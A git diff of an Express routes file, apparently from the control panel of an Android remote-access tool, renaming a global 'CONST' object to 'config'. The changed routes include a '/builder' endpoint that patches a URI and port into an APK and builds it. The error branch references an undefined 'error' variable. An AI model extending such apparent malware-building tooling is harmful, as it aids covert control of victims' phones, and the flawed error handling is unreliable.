@@ -5,7 +5,7 @@ const
     bodyParser = require('body-parser'),
     crypto = require('crypto');
 
-let CONST = global.CONST;
+let config = global.config;
 let db = global.db;
 let logManager = global.logManager;
 let app = global.app;
@@ -65,7 +65,7 @@ routes.get('/logout', isAllowed, (req, res) => {
 
 routes.get('/builder', isAllowed, (req, res) => {
     res.render('builder', {
-        myPort: CONST.control_port
+        myPort: config.control_port
     });
 });
 
@@ -73,21 +73,21 @@ routes.post('/builder', isAllowed, (req, res) => {
     if ((req.query.uri !== undefined) && (req.query.port !== undefined)) apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
         if (!error) apkBuilder.buildAPK((error) => {
             if (!error) {
-                logManager.log(CONST.logTypes.success, "Build Succeded!");
+                logManager.log(config.logTypes.success, "Build Succeded!");
                 res.json({ error: false });
             }
             else {
-                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
+                logManager.log(config.logTypes.error, "Build Failed - " + error);
                 res.json({ error });
             }
         });
         else {
-            logManager.log(CONST.logTypes.error, "Build Failed - " + error);
+            logManager.log(config.logTypes.error, "Build Failed - " + error);
             res.json({ error });
         }
     });
     else {
-        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
+        logManager.log(config.logTypes.error, "Build Failed - " + error);
         res.json({ error });
     }
 });
